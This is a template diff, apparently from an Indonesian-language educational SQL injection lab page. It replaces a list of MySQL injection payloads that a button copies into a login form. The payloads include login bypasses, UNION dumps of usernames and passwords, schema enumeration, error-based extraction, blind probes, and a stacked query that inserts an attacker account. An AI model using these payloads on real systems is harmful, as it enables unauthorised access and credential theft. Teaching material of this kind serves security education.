@@ -301,47 +301,23 @@ head_extra %}
     <strong>Daftar Payload SQL Injection (Referensi Akademik)</strong>
     <span
       style="font-size: 0.75rem; color: var(--text-secondary); font-weight: 400"
-      >Kategori MySQL • Klik <em>Try</em> untuk menyalin payload ke form</span
+      >Kategori MySQL &bull; Klik <em>Gunakan</em> untuk menyalin payload ke form</span
     >
   </div>
   <div class="card-body pt-2 pb-2">
-    {% set cheats = [ ( "Classic Auth Bypass", "Mengevaluasi kondisi logika OR
-    yang selalu bernilai TRUE", "' OR '1'='1' -- ", "x", "", "Hasil Kueri: WHERE
-    username='' OR '1'='1' -- Membaca seluruh baris database dan meloloskan
-    login." ), ( "Comment Bypass (Admin)", "Masuk sebagai user tertentu tanpa
-    mengetahui password", "admin' -- ", "kosong", "", "Tanda komentar '-- '
-    memotong sisa kueri pemeriksaan kata sandi." ), ( "UNION - Dump All Users",
-    "Eksfiltrasi seluruh isi data user dari tabel database", "' UNION SELECT id,
-    username, password FROM users -- ", "x", "", "Mencocokkan jumlah kolom untuk
-    menyatukan rekaman tabel users asli dengan hasil login." ), ( "UNION -
-    Schema Enum", "Melakukan pemetaan struktur tabel & kolom sistem database",
-    "' UNION SELECT 1, table_name, column_name FROM information_schema.columns
-    WHERE table_schema=database() -- ", "x", "", "Mengekstrak nama tabel dan
-    kolom dari skema information_schema di MySQL." ), ( "Boolean Blind",
-    "Menebak karakter kata sandi satu per satu via logika respon", "' AND
-    (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ",
-    "x", "", "Jika tebakan karakter pertama benar, halaman akan merespon
-    sukses." ), ( "Error-Based (ExtractValue)", "Memancing MySQL memuntahkan
-    error XML yang berisi data rahasia", "' AND
-    extractvalue(1,concat(0x3a,(SELECT password FROM users LIMIT 1))) -- ", "x",
-    "", "Fungsi extractvalue() memicu error XML yang menampilkan data sensitif."
-    ), ( "Time-Based Blind", "Mengetahui keberadaan data lewat estimasi delay
-    waktu eksekusi", "' AND IF((SELECT COUNT(*) FROM
-    users)>0,BENCHMARK(5000000,MD5(NOW())),0) -- ", "x", "", "Mengeksekusi
-    operasi berat BENCHMARK() jika kondisi bernilai TRUE untuk mendelay respon."
-    ), ( "UNION - MySQL Version", "Mencari versi spesifik dari database engine
-    aktif", "' UNION SELECT 1, version(), 3 -- ", "x", "", "Memanggil fungsi
-    bawaan version() untuk profiling database MySQL." ), ( "Error-Based
-    (UpdateXML)", "Memancing MySQL memuntahkan error XML parsing yang berisi
-    data", "' AND updatexml(1,concat(0x3a,(SELECT table_name FROM
-    information_schema.tables LIMIT 1)),1) -- ", "x", "", "Fungsi updatexml()
-    memicu error XML parsing yang menampilkan nama tabel." ), ( "Error-Based
-    (GeometryCollection)", "Memancing MySQL memuntahkan error geometri yang
-    berisi data sensitif", "' AND geometrycollection((SELECT * FROM (SELECT *
-    FROM (SELECT password FROM users LIMIT 1) AS t) AS t2)) -- ", "x", "",
-    "Konstruksi geometri yang tidak valid memicu error yang menampilkan data
-    sensitif." ) ] %} {% for name, desc, payload_user, payload_pass, badge, note
-    in cheats %}
+    {% set cheats = [
+      ( "Error Based", "Memancing error XML parsing untuk menampilkan data sensitif", "' AND updatexml(1,concat(0x3a,(SELECT password FROM users LIMIT 1)),1) -- ", "x", "", "Memicu error UpdateXML yang menampilkan isi field password." ),
+      ( "Illegal Query", "Menjalankan query dengan sintaks tidak valid / illegal", "' OR (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b) -- ", "x", "", "Memicu error subquery atau join yang tidak valid." ),
+      ( "Union Based", "Menggabungkan hasil query asli dengan query SELECT tambahan", "' UNION SELECT 1, username, password FROM users -- ", "x", "", "Mengekstrak data dari tabel users secara langsung ke layar." ),
+      ( "Tautology", "Menggunakan kondisi logika OR yang selalu bernilai TRUE", "' OR '1'='1' -- ", "x", "", "Bypass login karena kueri menghasilkan nilai TRUE." ),
+      ( "Stored Procedure", "Memanggil fungsi atau prosedur bawaan database engine", "admin'; CALL sys.ps_setup_reload_saved() -- ", "x", "", "Mengeksekusi stored procedure bawaan database MySQL." ),
+      ( "End-of-Line Comment", "Memotong sisa kueri password menggunakan tanda komentar", "admin' -- ", "x", "", "Mengabaikan verifikasi password dengan memotong sisa query." ),
+      ( "Inline Comments", "Menggunakan komentar inline /**/ untuk memanipulasi parsing", "admin'/**/OR/**/'1'='1", "x", "", "Mengelabui pemrosesan parser atau WAF menggunakan inline comments." ),
+      ( "Stacked Queries", "Menjalankan banyak kueri SQL menggunakan pemisah titik koma", "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'hacker123'); -- ", "x", "", "Menambahkan kueri INSERT baru setelah kueri login." ),
+      ( "Time-based blind", "Mengetahui status kondisi logika via delay respon (sleep)", "' AND IF(1=1, sleep(5), 0) -- ", "x", "", "Menunda respon server selama 5 detik jika kondisi bernilai benar." ),
+      ( "Boolean-Based Blind", "Menguji logika kondisi BENAR/SALAH untuk menebak data", "' AND (SELECT 1 FROM users WHERE username='admin')='1' -- ", "x", "", "Memeriksa apakah user 'admin' ada dengan mengamati respon sukses." )
+    ] %}
+    {% for name, desc, payload_user, payload_pass, badge, note in cheats %}
     <div class="cheat-item">
       <div class="cheat-header">
         <div class="cheat-meta">
@@ -354,8 +330,8 @@ head_extra %}
         <button
           class="try-btn js-cheat-btn"
           type="button"
-          data-username="{{ payload_user | tojson }}"
-          data-password="{{ payload_pass | tojson }}"
+          data-username="{{ payload_user }}"
+          data-password="{{ payload_pass }}"
         >
           Gunakan
         </button>
@@ -378,8 +354,8 @@ head_extra %}
 
     document.querySelectorAll(".js-cheat-btn").forEach((button) => {
       button.addEventListener("click", () => {
-        usernameInput.value = JSON.parse(button.dataset.username || '""');
-        passwordInput.value = JSON.parse(button.dataset.password || '""');
+        usernameInput.value = button.dataset.username || "";
+        passwordInput.value = button.dataset.password || "";
         usernameInput.focus();
       });
     });
